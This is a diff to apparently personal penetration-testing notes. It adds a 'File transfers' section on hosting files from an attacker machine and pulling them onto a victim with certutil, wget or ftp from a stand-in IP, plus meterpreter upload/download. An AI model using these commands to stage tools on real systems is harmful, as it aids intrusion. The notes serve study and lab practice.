@@ -446,7 +446,7 @@ curated list of Unix binaries that can be used to bypass local security restrict
 [GTFOBins](https://gtfobins.github.io/)
 
 ----
-### Browser Extensions
+## Browser Extensions
 #### FoxyProxy 
 Useful for settings Browser for using BurpSuite
 
@@ -454,3 +454,29 @@ add the firefox [extension](https://addons.mozilla.org/nl/firefox/addon/foxyprox
 Go to the Settings > Add Proxy
 Set the proxy in this way:
 ![[Pasted image 20240215140635.png]]
+
+-----
+## File transfers
+Usually as attacker we -->  host files
+### Host a file 
+navigate to the directory where you have your files that you want to be hosted:
+`python3 -m http.server 80`
+or
+`python3 -m pyftpdlib 21`
+
+### Retrieve a file
+#### Windows
+`certutil.exe -urlcache -f http://10.10.10.10/file filename_for_download`
+#### Linux
+`wget http://10.10.10.10/file`
+
+
+<span style="background:#fff88f">If `certutil` and `wget` are not working:</span>
+`python3 -m pyftpdlib 21`   -->  from the attacker
+`ftp 10.10.10.10`                  -->  from the victim
+
+### Metasploit
+if you have a meterpreter shell -->  you can use the features `upload/download`
+                               to download and upload a file
+
+-----
